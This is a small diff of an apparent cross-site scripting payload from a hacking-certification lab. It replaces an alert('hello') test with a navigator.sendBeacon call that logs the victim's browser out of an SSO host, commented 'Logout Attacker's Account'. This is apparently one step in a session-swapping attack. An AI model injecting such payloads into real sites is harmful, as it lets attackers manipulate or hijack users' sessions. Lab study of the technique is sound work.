@@ -1,4 +1,3 @@
-alert("hello")
 //Logout Attacker's Account
 navigator.sendBeacon("http://sso-eejn99.hackthecert.systems/logout","");
 
